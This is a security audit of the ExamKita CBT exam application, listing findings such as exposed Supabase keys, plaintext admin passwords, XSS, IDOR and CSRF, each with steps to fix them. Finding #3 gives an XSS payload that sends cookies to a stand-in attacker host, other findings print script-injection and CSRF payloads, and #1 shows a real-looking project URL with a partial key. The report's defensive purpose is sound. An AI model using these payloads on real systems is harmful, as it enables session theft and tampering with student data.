# CBT SECURITY AUDIT - DETAILED FINDINGS

**Date:** 2026-05-14
**Application:** ExamKita CBT Online
**Risk Level:** 🔴 CRITICAL
**Total Issues Found:** 20

---

## EXECUTIVE SUMMARY

The ExamKita CBT application has **CRITICAL security vulnerabilities** that pose immediate risk to:
- Student data privacy
- Exam integrity
- Admin system access
- Institutional liability

**Recommendation:** DISABLE application immediately until critical issues are remediated.

---

## CRITICAL FINDINGS (Must Fix Immediately)

### 🔴 #1: EXPOSED API CREDENTIALS IN CLIENT CODE

**File:** admin-core.min.js, supabase-patch.min.js
**Severity:** CRITICAL
**CVSS Score:** 9.8

**Finding:**
Supabase API keys and database URL are hardcoded in minified JavaScript:
- URL: https://dmydinmosdxazypdwbed.supabase.co
- anonKey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

**Attack Vector:**
1. Open browser DevTools (F12)
2. Search for "SUPABASE_CONFIG" in JavaScript
3. Extract API key
4. Query database directly from browser console
5. Read/modify all exam data, student answers, scores

**Business Impact:**
- Complete data breach
- Exam answer keys exposed
- Student records compromised
- Regulatory violations (GDPR, FERPA)

**Remediation:**
- ROTATE API KEYS IMMEDIATELY
- Move all API calls to backend server
- Use environment variables for secrets
- Implement Row-Level Security (RLS) in Supabase
- Never expose credentials in frontend code

---

### 🔴 #2: WEAK ADMIN AUTHENTICATION

**File:** admin-auth.min.js, admin.html
**Severity:** CRITICAL
**CVSS Score:** 9.1

**Finding:**
Admin password stored in plain text in sessionStorage:
```
sessionStorage.setItem("admin_pwd", password);
```

**Attack Vector:**
1. Open DevTools → Application → Session Storage
2. Read admin_pwd value in plain text
3. Use password to access admin panel
4. Full system compromise

**No Rate Limiting:**
- Can brute force password with unlimited attempts
- No account lockout mechanism
- No failed login logging

**Business Impact:**
- Unauthorized admin access
- Exam manipulation
- Student data theft
- Score tampering

**Remediation:**
- Never store passwords client-side
- Implement JWT token-based auth
- Hash passwords with bcrypt/Argon2 on server
- Add rate limiting (5 attempts per 15 minutes)
- Implement account lockout
- Use HTTPS only

---

### 🔴 #3: STORED XSS VULNERABILITIES

**File:** admin-core.min.js, admin-ops-enhancements.min.js
**Severity:** CRITICAL
**CVSS Score:** 8.8

**Finding:**
User-controlled data inserted directly into innerHTML without escaping:
```javascript
a.innerHTML = e.activeExams.map(a => {
  return `<div>${a.nama}</div>`  // NOT ESCAPED
}).join("");
```

**Attack Vector:**
1. Create exam with malicious name:
   `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
2. When admin views dashboard, JavaScript executes
3. Admin session cookie stolen
4. Attacker gains admin access

**Business Impact:**
- Admin account compromise
- Malware distribution
- Phishing attacks
- Data exfiltration

**Remediation:**
- Use textContent instead of innerHTML for user data
- Implement HTML escaping function
- Use DOMPurify library for sanitization
- Implement Content Security Policy (CSP) headers
- Use templating libraries with auto-escaping

---

### 🔴 #4: UNVALIDATED FILE UPLOAD

**File:** admin-import.min.js, src/excel-importer.js
**Severity:** CRITICAL
**CVSS Score:** 8.6

**Finding:**
Excel import accepts any data without validation:
- No field validation
- No HTML sanitization
- No file type verification
- No size limits

**Attack Vector:**
1. Create malicious Excel file with:
   - Question: `<script>alert('XSS')</script>`
   - Options: `<img src=x onerror=alert(1)>`
2. Upload via admin panel
3. Malicious code stored in database
4. Executes for all students taking exam

**Business Impact:**
- Stored XSS affecting all students
- Exam system compromise
- Student device compromise
- Credential theft from students

**Remediation:**
- Validate all imported fields
- Sanitize HTML content
- Check file magic bytes (not just extension)
- Implement file size limits (max 5MB)
- Scan for malicious patterns
- Use server-side validation

---

### 🔴 #5: INSECURE DIRECT OBJECT REFERENCES (IDOR)

**File:** exam-core.min.js, admin-core.min.js
**Severity:** CRITICAL
**CVSS Score:** 8.1

**Finding:**
No authorization checks on exam access:
```javascript
const examId = urlParams.get('id');
const examData = await db.ref(`/jadwal/${examId}`).once('value');
// No verification that user is authorized
```

**Attack Vector:**
1. Student enrolled in Class A, exam_123
2. Change URL to exam_456 (Class B exam)
3. Can now take unauthorized exam
4. Can view answer keys before exam
5. Can access other students' results

**Business Impact:**
- Exam integrity compromised
- Unauthorized exam access
- Answer key exposure
- Score manipulation

**Remediation:**
- Verify authorization server-side
- Check user enrollment in exam
- Implement proper ACL (Access Control Lists)
- Validate all requests server-side
- Never trust client-side IDs

---

### 🔴 #6: SENSITIVE DATA IN LOCALSTORAGE

**File:** Multiple files
**Severity:** CRITICAL
**CVSS Score:** 8.3

**Finding:**
Sensitive data stored unencrypted in localStorage:
- CBT_EXAM_SESSION (contains user ID, exam config)
- CBT_CACHE_JADWAL_[userId] (exam schedule)
- admin_auth (admin flag)
- Student answers

**Attack Vector:**
1. XSS vulnerability exploited
2. Attacker reads localStorage
3. Gets all exam answers before submission
4. Gets admin auth token
5. Gets student session data

**Business Impact:**
- Complete data exposure
- Answer key theft
- Session hijacking
- Exam cheating

**Remediation:**
- Use sessionStorage for temporary data (cleared on close)
- Encrypt sensitive data before storing
- Use HTTP-only cookies for auth tokens
- Implement data expiration
- Clear data on logout

---

### 🔴 #7: NO CSRF PROTECTION

**File:** All API calls
**Severity:** CRITICAL
**CVSS Score:** 8.2

**Finding:**
No CSRF tokens in state-changing requests:
```javascript
await fetch('/api/import_soal', {
  method: 'POST',
  body: JSON.stringify({...})
  // NO CSRF TOKEN
});
```

**Attack Vector:**
1. Attacker creates malicious website
2. Admin visits attacker's site while logged in
3. Site makes request to delete exam: `<img src="/api/delete_exam?id=123">`
4. Exam gets deleted without admin knowledge

**Business Impact:**
- Unauthorized state changes
- Data deletion
- Exam manipulation
- Score tampering

**Remediation:**
- Add CSRF tokens to all state-changing requests
- Use SameSite cookie attribute
- Validate Origin/Referer headers
- Use POST instead of GET

---

### 🔴 #8: UNENCRYPTED DATA TRANSMISSION

**File:** All network requests
**Severity:** CRITICAL
**CVSS Score:** 8.7

**Finding:**
- No HTTPS enforcement
- No HSTS header
- No certificate pinning
- Data transmitted in plain text

**Attack Vector:**
1. Attacker performs Man-in-the-Middle (MITM) attack
2. Intercepts network traffic
3. Reads exam answers
4. Reads student IDs and passwords
5. Modifies exam questions in transit
6. Modifies student answers

**Business Impact:**
- Complete data interception
- Credential theft
- Exam manipulation
- Data modification

**Remediation:**
- Enforce HTTPS only
- Use TLS 1.3 minimum
- Add HSTS header (max-age=31536000)
- Implement certificate pinning
- Redirect HTTP to HTTPS

---

## HIGH SEVERITY FINDINGS (7 Issues)

### 🟠 #9: No Rate Limiting
- Unlimited password attempts
- Vulnerable to brute force
- No account lockout

### 🟠 #10: Missing CSP Headers
- No Content-Security-Policy
- Allows inline scripts
- Can load scripts from anywhere

### 🟠 #11: Unvalidated Question Text
- Questions rendered with innerHTML
- Can contain malicious scripts
- Affects all students

### 🟠 #12: Weak Session Management
- No session timeout
- No refresh tokens
- Sessions never expire

### 🟠 #13: No Audit Logging
- Logs stored in localStorage (can be deleted)
- No server-side logging
- Cannot detect breaches

### 🟠 #14: Direct API Calls from Frontend
- Frontend calls Supabase directly
- No server-side validation
- Can bypass all security

### 🟠 #15: Minimal Cheating Protection
- Easy to bypass
- No tab switching detection
- No copy-paste prevention
- No proctoring

---

## MEDIUM SEVERITY FINDINGS (5 Issues)

### 🟡 #16-20: Configuration, Headers, Error Handling
- Hardcoded configuration
- Missing security headers
- No API rate limiting
- Insufficient error handling
- No HTTPS enforcement

---

## COMPLIANCE VIOLATIONS

### GDPR Violations
- No data encryption
- No data retention policy
- No user consent
- No data export
- No right to be forgotten

### FERPA Violations (Student Privacy)
- Student data not protected
- No access controls
- Exam answers accessible to unauthorized users

---

## REMEDIATION TIMELINE

### PHASE 1: EMERGENCY (24 hours)
1. Rotate Supabase API keys
2. Disable application
3. Notify users
4. Implement emergency auth

### PHASE 2: CRITICAL (1 week)
1. Move API to backend
2. Implement JWT auth
3. Add input validation
4. Enforce HTTPS
5. Implement authorization

### PHASE 3: HIGH (2 weeks)
1. Add rate limiting
2. Implement CSP
3. Add CSRF protection
4. Server-side logging
5. Session management

### PHASE 4: MEDIUM (4 weeks)
1. Security headers
2. API rate limiting
3. Error handling
4. Data encryption
5. GDPR compliance

---

## RISK ASSESSMENT

**Current Risk Level:** 🔴 CRITICAL
**Likelihood of Breach:** Very High
**Impact if Breached:** Catastrophic
**Regulatory Exposure:** Severe

**Recommendation:** IMMEDIATE ACTION REQUIRED

Disable application until critical vulnerabilities are fixed.

